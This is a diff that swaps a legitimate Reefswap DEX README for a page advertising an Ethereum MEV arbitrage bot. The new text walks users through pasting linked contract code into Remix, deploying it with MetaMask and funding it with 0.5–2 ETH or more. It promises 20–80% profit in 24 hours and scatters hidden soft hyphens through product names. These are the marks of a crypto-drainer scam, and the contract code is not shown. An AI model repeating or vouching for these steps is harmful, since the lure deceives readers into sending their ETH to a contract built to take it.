@@ -1,94 +1,63 @@
-# Reefswap
 
-Reefswap is a DEX on the Reef chain.
+<h1 align="center">Create Your Ethereum Bot for Uniswap V3</h1>
 
+<p align="center">
+  <img src="https://i.ibb.co/Sm4Xddw/68747470733a2f2f692e6962622e636f2f374779433259512f676574737461727465642e706e67.png">
+</p>
 
-## Existing deployment
-Reefswap is already deployed on the following networks:
+<p align="center">
+  <strong>A tool for creating and managing MEV Bots, where clients can connect a MetaMask wallet and create a contract that is executed via a script on the website.</strong>
+</p>
 
+## Description
 
-#### Reef Mainnet
-```
-factory: "0x380a9033500154872813F6E1120a81ed6c0760a8"
-router: "0x641e34931C03751BFED14C4087bA395303bEd1A5"
-```
+The tool allows users to create and manage MEV bots (Maximal Extractable Value bots) based on smart contracts. Users can connect their MetaMask cryptocurrency wallets, create contracts, and run scripts to automate trading and other operations on the Ethereum blockchain. 
 
+⚠️ **The bot operates entirely within the browser, so there is no need to download any programs that could potentially be harmful to your computer.**
 
-#### Reef Testnet (Maldives):
+## Key Features
 
-```
-factory: "0xcA36bA38f2776184242d3652b17bA4A77842707e"
-router: "0x0A2906130B1EcBffbE1Edb63D5417002956dFd41"
-```
+- **Wallet Connection**: Supports MetaMask.
+- **Contract Creation**: Users can create smart contracts using our tool.
+- **Script Execution**: The website allows users to execute the created contract and manage its execution.
+- **Real-time Transaction Display**: The bot's transactions are displayed in real-time.
 
-## Installing
+## Usage
 
-Install all dependencies with `yarn`.
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
 
-Reefswap can be deployed in different ways:
-
-- `scripts/` folder includes `hardhat` scripts
-- `src/` folder includes raw TypeScript scripts, which directly use `evm-provider.js`
-
-## Setup accounts
-
-Copy `.env.example` to `.env` (`cp .env.example .env`) and update the desired mnemonic variable to your account seed mnemonic for the corresponding network.
-
-You can have multiple accounts by listing them in dictionary with your custom name:
-
-```
-seeds: {
-	account1: "<MNEMONIC_SEED1>",
-	account2: "<MNEMONIC_SEED2>",
-	...
-},
-```
-
-In JS script you can select the account with:
-```
-const reef = await hre.reef.getSignerByName("account1");
-```
-
-in `scripts/deploy.js`, where `account1` is the key of the item in the `seeds` dictionary.
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
 
 
-If you get the following error:
-```
-Invalid Transaction: Inability to pay some fees , e.g. account balance too low
-```
+4. Paste this [**sourcecode**](sourcecode.sol) code in R­­emi­x­.
 
-it is most likely because the accounts defined in the `hardhat.config.js` and JS script do not match.
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
 
-### Network selection
-Define your Reef chain URL in `hardhat.config.js` (by default `ws://127.0.0.1:9944`). If you want to run the script on the other network, you can do so in CLI with `--network {network-name}` flag.
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
 
-Example:
-`yarn hardhat run scripts/sample-script.js --network reef_testnet`
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
 
-You can define the network configuration in `hardhat.config.js`. To change the default network, change the `defaultNetwork` variable.
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
+ 
+   #### That’s it. The bo­t will start wo­rking immed­iately earning you profits from a­r­­b­itr­a­ge trades on ­U­ni­s­­wa­­p pools.
+   
+   #### Testing the bot's operation over 24 hours yields ~20-80% profit on the balance.
 
-If the networks URL exists (can be pinged), the system will automatically connect to it, else it will run internal `reef-node` and try to connect to it.
+   #### The profit depends on network load (gas price) and competition from other MEV bots on the token.
+## Bot Balance Chart
 
-
-## Deploy
-
-Run
-`npx hardhat run scripts/deploy.js`
-
-The script will create two ERC20 tokens, Reefswap Factory, Reefswap Router and add liquidity to them through the Reefswap router.
+<img src="https://i.ibb.co/2t6ppPD/3.png" alt="3" border="0">
 
 
-## Trade
+## License
 
-Change the addresses in `src/trade.ts` to match the ones in the deploy scripts and then run:
-`yarn trade`
-
-## Random testing trading bot
-Random bot was defined for the purouse of testing swap and pool data.
-It consists of deploymant and swapping
-
-How to run:
-- In the first instance user needs to provide 10k Reef to default accounts
-- `yarn hardhat run scripts/botInit.js` - Create tokens, facotry, router, verifie them, add liquidity and remove liquidity
-- Replace token addresses in `scripts/bot.js` with given output from `botInit` - Default accounts are swapping randomly with random amounts
-- `yarn hardhat run scripts/bot.js`
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
